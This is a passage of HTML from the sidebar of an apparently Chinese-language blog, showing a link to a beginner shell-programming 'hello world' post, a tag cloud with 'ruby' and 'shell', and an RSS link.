        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
    </li>
    
</ul>
    </section>

    

    <section class="widget">
        <h3 class="widget-title"><a href="/categories">分类</a></h3>
<ul class="widget-list">
    
</ul>
    </section>

    <section class="widget">
        <h3 class="widget-title"><a href="/tags">标签</a></h3>
<div class="tagcloud">
    
    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
    
    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
    
</div>
    </section>

    

    <section class="widget">
        <h3 class="widget-title">其它</h3>
        <ul class="widget-list">
            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
        </ul>
    </section>
</div>
            </div>
        </div>
    </div>
</body>

</html>